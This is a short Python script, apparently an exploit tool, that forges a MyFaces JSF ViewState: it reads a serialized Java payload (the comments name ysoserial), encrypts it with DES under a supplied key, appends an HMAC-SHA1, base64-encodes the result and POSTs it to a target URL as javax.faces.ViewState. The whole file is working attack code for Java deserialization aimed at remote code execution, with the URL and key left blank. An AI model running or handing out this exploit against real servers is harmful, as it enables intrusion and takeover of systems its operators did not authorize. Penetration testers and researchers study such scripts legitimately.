import requests
from hashlib import sha1
import hmac
import base64
import pyDes
import urllib.parse

url = ""
key = b""

#plaintext payload generated by e.g. ysoserial
with open("java_payload", "rb") as file:
	plain = file.read()

#plaintext payload encrypted with DES. Encryption specs found in http://svn.apache.org/repos/asf/myfaces/site/publish/core20/myfaces-impl/webconfig.html
des = pyDes.des(key, pyDes.ECB, pad=None, padmode=pyDes.PAD_PKCS5)
payload = des.encrypt(plain)

#Hashing
#The HMAC process mixes a secret key with the message data,hashes the result
#mixes that with the secret key again, and then applies the hash function a second time
#The output hash is 160 bits in length.
hashed = hmac.new(key, payload, sha1).digest()

#Appending hash to encrypted payload
final = base64.b64encode(payload + hashed)

#requests automatically URL encodes payload and sends it off
s = requests.post(url, data={"javax.faces.ViewState":final})
